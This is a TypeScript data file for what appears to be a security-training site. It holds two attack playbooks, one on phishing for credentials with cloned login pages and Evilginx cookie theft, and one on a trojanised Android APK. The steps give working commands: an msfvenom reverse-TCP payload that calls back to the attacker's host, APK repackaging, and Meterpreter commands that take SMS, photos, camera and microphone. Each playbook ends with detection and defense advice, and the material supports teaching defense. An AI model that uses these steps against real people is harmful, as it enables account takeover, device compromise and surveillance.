import type { AttackPlaybook } from "../types";

export const ATTACK_PLAYBOOKS_1A: AttackPlaybook[] = [
  {
    slug: "phishing-credential-harvest",
    title: "Phishing for credentials",
    icon: "🎣",
    category: "social",
    summary:
      "A fake lookalike of a real login page (bank, Google, VPN) is planted and prey is lured to it — whatever they type goes straight to the attacker.",
    target: "Anyone with a web login: employees, students, everyday users.",
    impact:
      "Usernames + passwords, OTP sometimes bypassed, then account takeover, data theft, or a foothold inside a company.",
    tools: ["set", "gophish", "evilginx", "socialfish", "burpsuite", "seclists"],
    introMd: `Phishing is the #1 way real breaches start — because it targets a person, not a service. The attacker clones a login page (or rides a real one), sends victims a link, and waits. The "hack" is the deception loop: *the victim hands over their own credentials to the attacker's server*.

The whole technique runs in four moves:

1. **Copy the target's login page** (or proxy the real one).
2. **Serve it** from a domain/URL that looks plausible.
3. **Deliver the link** (email, SMS, QR code, a compromised page).
4. **Collect** what victims type, then use front-end trickery to make the login *appear* to fail so they don't know they've been owned.

> **Lab rule — you only run this against your own accounts, a clone you host, or explicitly authorised training targets.** Everything here is the exact same playbook defenders test themselves with.`,
    steps: [
      {
        title: "Clone the login page",
        md: `The clone is the whole trick — it must look exactly like the login:

\`\`\`bash
# The Social-Engineering Toolkit: 1 (Social-Engineering Attacks) → 2 (Website Vector)
# → 3 (Credential Harvester Attack Method) → 2 (Site Cloner)
setoolkit
# target: the exact URL of the login you're cloning
# It serves a copy that POSTs submitted passwords back to your listener.
\`\`\`

**The pro version — live proxy with Evilginx:** the clone only mimics the *HTML*; a real password can still land inside a captcha or MFA flow. \`evilginx\` proxies the genuine site and steals **session cookies after a real login** — which defeats many OTP/MFA setups because the attacker ends up holding a live authenticated session, not just a password.

Copy the page's HTML/CSS with \`wget --mirror\` (or Burp's save-all-resources) so the fake looks pixel-identical. Attackers spoof the address bar (a punycode lookalike domain, or a legit-looking subdomain like \`support-real-google.com\`).`,
      },
      {
        title: "Host and make it believable",
        md: `The clone must survive a glance:

- Use a domain that resembles the brand (\`accounts-secure.example\`, \`login-bankname.io\`).
- Serve over HTTPS — a padlock makes victims type. Free certs come from Let's Encrypt, or the attacker ships an IPFS/hosting link.
- Land a real favicon, real logo, and near-identical layout (right-click view-source + \`wget\` replay does this in minutes).
- Set the \`Referer\` and page title to match; some ops mirror the TLS cert subject too.

**HTTPS ease**: a free cert on the fake domain is enough for most people. The technical gap between "looks right" and "is right" is what phishing exploits.`,
      },
      {
        title: "Deliver the hook",
        md: `Delivery beats URL quality almost always — most phish arrive via:

- **Email**: \`gophish\`/SocialFish send tracker-equipped mailshots; the link is the clone, the subject is "Password expires", "Invoice", "Shared document".
- **SMS (smishing)** with a shortened link that looks innocuous.
- **QR codes on posters/devices** — phones strip the URL away, so the domain is invisible to the eye.
- **Compromised legit pages**: an attacker who owns any site can drop a phish script that only fires for a chosen login next time.

The point: the *link text* rarely matches the *domain*, and urgency ("verify within 24h") is the conversion engine.`,
      },
      {
        title: "Collect the prize",
        md: `The POST data lands in your listener:

\`\`\`bash
# SET prints harvested creds to the console & saves to reports/
# Gophish stores campaigns + submitted data in its dashboard
# Evilginx dumps the proxied session cookie to the terminal
\`\`\`

After capture the attacker:

1. **Replays the credential** against the real site (credential stuffing, or manually).
2. **Flips the page to "error: try again"** so the victim keeps typing until login genuinely fails — that's why the same account often shows up twice.
3. If a cookie was taken, loads it straight into the browser for a **live session takeover** — no password replay even needed.

Then the storm: the stolen login gets stuffed across other sites, the password gets run through \`hashcat\` variants, and the inbox/2FA gets probed.`,
      },
    ],
    detectionMd: `- Look at the **domain, not the display name** — one typo in the real hostname is the tell.
- Check the URL bar padlock *and* the exact hostname; HTTPS ≠ legitimacy.
- Hover the link before clicking; mismatched anchor text = red flag.
- Unexpected login/2FA prompts, "verify now" urgency and attachments from strangers.
- **Server side**: SIEM rules on "many POSTs to /login from one IP in a burst", fake-domain TLS monitoring, and DMARC reports showing your domain being forged.

**The victim-side tell that matters most**: an email you didn't ask for that *directs you to log in*.`,
    defenseMd: `1. **Never trust a login link you didn't request** — navigate to the site by typing its domain or using a bookmark, then log in there.
2. **2FA everywhere**, prefer hardware keys (FIDO2) — a session cookie is still stolen, but key-based MFA challenges cannot be played back by Evilginx-style proxies.
3. **Password manager**: it fills credentials only on the *matching domain*, instantly exposing spoofed clones.
4. **Employees**: report suspicious mail; use DMARC/SPF/DKIM + banner-the-unknown-sender.
5. **Org layer**: FIDO2 hardware keys for staff, SIEM detection on auth-source anomalies, phishing simulations (authorised, with an internal \`gophish\` campaign) keep the muscle trained.

**The reality check:** the fix is mostly habits, not tools — and the habits are: verify the domain, use a password manager, and feed logins to 2FA.`,
  },
  {
    slug: "malicious-apk-remote-access",
    title: "Malicious APK — remote access to a phone",
    icon: "📱",
    category: "mobile",
    summary:
      "A trojanised Android app is built with a reverse-shell payload, sent as an APK, and when the victim installs and opens it, the attacker gains a live session into the phone.",
    target: "Anyone who sideloads apps or installs APKs from outside the Play Store.",
    impact:
      "Files (gallery, downloads, internal storage), SMS, call logs, camera/mic via post-exploitation, and keystrokes — i.e. total device compromise.",
    tools: ["msfvenom", "metasploit", "apktool", "seclists"],
    introMd: `This is the phone version of "payload delivery": the attacker builds an Android APK that is genuinely a *remote-access tool*, then gets it installed. Once it runs, it calls home to a listener, and the attacker gets a Meterpreter session — the phone's files, logs, camera, mic, everything a session can reach.

The chain has five parts: **build → disguise → deliver → install → use the session**.

> ⚠️ **Lab + authorised only.** You build and run this exclusively against devices you own, in an emulator (Android Studio AVD / Genymotion), or with written scope. Phones are people — deploying this on a device you don't control is illegal in every jurisdiction and exactly what the defensive course you're in is training against.`,
    steps: [
      {
        title: "Build the payload APK",
        md: `\`\`\`bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 \
  -o EvilApp.apk
\`\`\`

- The APK embeds a reverse TCP shell that phones home to your \`LHOST:LPORT\`.
- A real lab listens from the host or an emulator: start your listener first (\`msfconsole\` \`multi/handler\`, payload \`android/meterpreter/reverse_tcp\`).
- Test the build is valid with \`apktool\` before shipping it anywhere.

**Why reverse?** The phone sits behind NAT/carrier; the *phone* dials *you*, so no inbound port on the victim side is needed.`,
      },
      {
        title: "Disguise it as a real app",
        md: `\`\`\`bash
apktool d RealApp.apk                 # decompile a legit app
# inside the smali, inject your payload classes / replace the entry point
apktool b . -o EvilApp.apk            # rebuild
# sign it — Android refuses unsigned APKs
\`\`\`

The disguise ladder (harder → better):

1. Rename the icon + app name and drop a copy of a real app's manifest.
2. **Repackage a genuine app** (e.g. a game that lazily asks no permissions) and graft the payload into it — "I'm updating" is a much easier yes than "install this unknown app".
3. Use \`dex2jar\`+reverse APK tooling to swap the entry point so the app *behaves* normal while the payload fire in the background.

**The permission tell defenders look for:** the trojan needs internet + storage + often SMS/camera at install time. Legit apps that suddenly want everything are crimson.`,
      },
      {
        title: "Deliver the APK",
        md: `Android blocks sideloading with scary warnings — so delivery is the hard part:

- **Direct message/email** ("app update", "game hack", "apk for beta") — urgent + outside the store is the ask.
- **QR code** — the victim's phone opens and downloads; the address bar is hidden by design.
- **A convincing app-store lookalike page** delivering the APK.
- **Compromised/legit sites** serving the APK to "visitors".

Trust is the product: "install this for the game/mod/tool you wanted" beats any technical trick.`,
      },
      {
        title: "Catch the callback & drive the session",
        md: `The moment the victim opens the app, the phone dials your listener:

\`\`\`text
msf6 > sessions
sessions -i 1
meterpreter > sysinfo
meterpreter > ls /sdcard/Download
meterpreter > download /sdcard/DCIM/Camera IMG_0092.jpg /home/you/loot
meterpreter > dump_sms
meterpreter > webcam_snap
meterpreter > record_mic
\`\`\`

What "remote access to someone's files" actually means with a session: internal storage (\`/sdcard\`), photos/DCIM, \`dump_sms\`, call logs (\`dump_contacts\`, \`dump_calllog\`), notifications, remote shell, and device camera/mic — each is a Meterpreter command.

The damage isn't one command though — it's persistence (the payload survives reboots via the app), evasion (payload staged from memory), and the attacker returning daily over weeks.`,
      },
    ],
    detectionMd: `**On the device:**
- Apps you never consciously installed + "Install from unknown sources" enabled.
- A battery/battery-drain app that keeps a persistent connection (wake locks, data constantly churning).
- Play Protect warnings, an app asking storage/SMS/camera with no reason.
- Check \`Settings → Apps\` for recent-sideloaded apps and \`Data usage\` for one app routing everything.

**On the network:** a phone that talks to an unfamiliar IP on port 4444 or a C2 domain, at odd hours — SIEM/NDR catch the beacon if the phone is on corporate Wi-Fi.

**In the app itself:** repackaged signatures + a hooks/exec-in-memory layer; Android's Play Protect and \`APK Signature Scheme\` lineage is the marker a real scanner keys on.`,
    defenseMd: `1. **Only install from official app stores.** Sideloaded APKs are how 99% of these start.
2. Keep **"Install unknown apps" off** and Play Protect on.
3. **Read the permissions** at install — if the app wants what it doesn't need, it's the trojan.
4. Review **installed apps + data usage** monthly; uninstall strangers.
5. **No sideloading on work phones**, device management (MDM) + corporate security checks.
6. Phones auto-update; updates patch the *payload-delivery flaws* too.

The one-paragraph version: treat every sideloaded APK as malware until proven otherwise, because the entire attack is convincing a human to skip that sentence.`,
  },
];